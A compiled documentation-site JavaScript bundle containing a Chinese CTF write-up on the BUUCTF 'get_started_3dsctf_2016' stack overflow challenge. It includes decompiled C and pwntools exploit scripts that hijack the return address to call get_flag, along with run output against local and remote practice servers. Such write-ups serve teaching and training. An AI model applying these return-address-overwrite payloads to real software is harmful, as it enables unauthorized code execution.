(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[78],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return p},kt:function(){return f}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},p=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),u=s(t),f=a,_=u["".concat(c,".").concat(f)]||u[f]||d[f]||o;return t?r.createElement(_,l(l({ref:n},p),{},{components:t})):r.createElement(_,l({ref:n},p))}));function f(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,l=new Array(o);l[0]=u;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i.mdxType="string"==typeof e?e:a,l[1]=i;for(var s=2;s<o;s++)l[s]=t[s];return r.createElement.apply(null,l)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},5030:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return i},contentTitle:function(){return c},metadata:function(){return s},toc:function(){return p},default:function(){return u}});var r=t(2122),a=t(9756),o=(t(7294),t(3905)),l=["components"],i={title:"get_started_3dsctf_2016",sidebar_position:9},c=void 0,s={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/get_started_3dsctf_2016",id:"BUUCTF/\u6808\u6ea2\u51fa/get_started_3dsctf_2016",isDocsHomePage:!1,title:"get_started_3dsctf_2016",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\get_started_3dsctf_2016.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/get_started_3dsctf_2016",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/get_started_3dsctf_2016",version:"current",sidebarPosition:9,frontMatter:{title:"get_started_3dsctf_2016",sidebar_position:9},sidebar:"tutorialSidebar",previous:{title:"ciscn_2019_n_8",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_n_8"},next:{title:"jarvisoj_level2",permalink:"/docs/BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level2"}},p=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],d={toc:p};function u(e){var n=e.components,t=(0,a.Z)(e,l);return(0,o.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"\u51fd\u6570\u4f20\u53c2")),(0,o.kt)("h2",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,o.kt)("p",null,"checksec\u7ed3\u679c\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=get_started_3dsctf_2016 \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   1991) Symbols     No    0               0               get_started_3dsctf_2016\n")),(0,o.kt)("p",null,"\u62d6\u5165ida\uff0c\u627e\u5230",(0,o.kt)("inlineCode",{parentName:"p"},"main"),"\u51fd\u6570"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4[56]; // [esp+4h] [ebp-38h] BYREF\n\n  printf("Qual a palavrinha magica? ", v4[0]);\n  gets(v4);\n  return 0;\n}\n')),(0,o.kt)("p",null,"\u5f88\u660e\u663e\u53ef\u4ee5\u6808\u6ea2\u51fa\u3002"),(0,o.kt)("p",null,"\u5728main\u51fd\u6570\u4e0a\u9762\u6709\u4e00\u4e2a\u51fd\u6570",(0,o.kt)("inlineCode",{parentName:"p"},"get_flag"),"\uff0c\u770b\u770b\u6e90\u7801"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'void __cdecl get_flag(int a1, int a2)\n{\n  int v2; // esi\n  unsigned __int8 v3; // al\n  int v4; // ecx\n  unsigned __int8 v5; // al\n\n  if ( a1 == 814536271 && a2 == 425138641 )\n  {\n    v2 = fopen("flag.txt", "rt");\n    v3 = getc(v2);\n    if ( v3 != 255 )\n    {\n      v4 = (char)v3;\n      do\n      {\n        putchar(v4);\n        v5 = getc(v2);\n        v4 = (char)v5;\n      }\n      while ( v5 != 255 );\n    }\n    fclose(v2);\n  }\n}\n')),(0,o.kt)("p",null,"\u7b26\u5408\u6761\u4ef6\u5c31\u8f93\u51faflag\u3002"),(0,o.kt)("p",null,"\u9996\u5148\u5c1d\u8bd5\u76f4\u63a5\u8df3\u8f6c\u5230fopen\u5904\u8fd0\u884c\uff0c\u8be5\u5904\u5730\u5740\u4e3a",(0,o.kt)("inlineCode",{parentName:"p"},"0x80489B8"),"\uff0c\u811a\u672c\u5982\u4e0b\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\nfrom LibcSearcher import *\n\nis_debug = 1\nfile_name = './get_started_3dsctf_2016'\nhost = 'node3.buuoj.cn'\nport = 25562\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    flag_add = 0x80489B8\n    payload = b'a' * 0x38 + p32(flag_add)\n    sh.sendline(payload)\n    print(sh.recvline())\n\nif __name__ == '__main__':\n    main()\n")),(0,o.kt)("p",null,"\u6267\u884c\u7ed3\u679c\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"[+] Starting local process './get_started_3dsctf_2016': pid 1401\nb'Qual a palavrinha magica? flag{Th1s_is_A_tEst_f1a9}\\n'\n[*] Stopped process './get_started_3dsctf_2016' (pid 1401)\n")),(0,o.kt)("p",null,"\u5f88\u987a\u5229\u5730\u8f93\u51fa\u4e86\u540c\u76ee\u5f55\u6d4b\u8bd5\u7528\u7684flag.txt\u3002"),(0,o.kt)("p",null,"\u6539\u6210\u8fdc\u7a0b\u5c1d\u8bd5\u4e00\u4e0b"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"[+] Opening connection to node3.buuoj.cn on port 27349: Done\nb'timeout: the monitored command dumped core\\n'\n[*] Closed connection to node3.buuoj.cn port 27349\n")),(0,o.kt)("p",null,"timeout\u4e86\uff0c\u8bf4\u660e\u6808\u6ca1\u6709\u5bf9\u9f50\u3002\u90a3\u4e48\u5c31\u662f\u8bf4\u4e0d\u80fd\u76f4\u63a5\u8df3\u8f6c\u5230fopen\u7684\u5730\u65b9\u8fd0\u884c\u83b7\u53d6flag\uff0c\u5f97\u6362\u4e00\u4e2a\u6cd5\u5b50\u3002\u90a3\u5c31\u6b63\u5e38\u8df3\u8f6c\u5230",(0,o.kt)("inlineCode",{parentName:"p"},"get_flag"),"\uff0c\u5c06\u53c2\u6570\u4f20\u5165\u8bd5\u8bd5\u3002"),(0,o.kt)("p",null,"payload\u5c31\u53d8\u6210\u4e86\uff1apadding + get_flag_add + get_flag\u7684\u8fd4\u56de\u5730\u5740 + a1 + a2"),(0,o.kt)("p",null,"\u56e0\u4e3a\u8f93\u51faflag\u540e\u6211\u4eec\u4e0d\u9700\u8981\u505a\u4ec0\u4e48\u4e86\uff0c\u76f4\u63a5\u8fd4\u56de\u5230exit\u5c31\u884c\u4e86\u3002"),(0,o.kt)("p",null,"\u6700\u7ec8\u811a\u672c\u4e3a\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 1\nfile_name = './get_started_3dsctf_2016'\nhost = 'node3.buuoj.cn'\nport = 27349\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    elf = ELF(file_name)\n    get_flag_add = elf.symbols['get_flag']\n    exit_add = elf.symbols['exit']\n    a1 = 0x308CD64F\n    a2 = 0x195719D1\n    payload = b'a' * 0x38 + p32(get_flag_add) + p32(exit_add) + p32(a1) + p32(a2)\n    sh.sendline(payload)\n    print(sh.recvline())\n\nif __name__ == '__main__':\n    main()\n")))}u.isMDXComponent=!0}}]);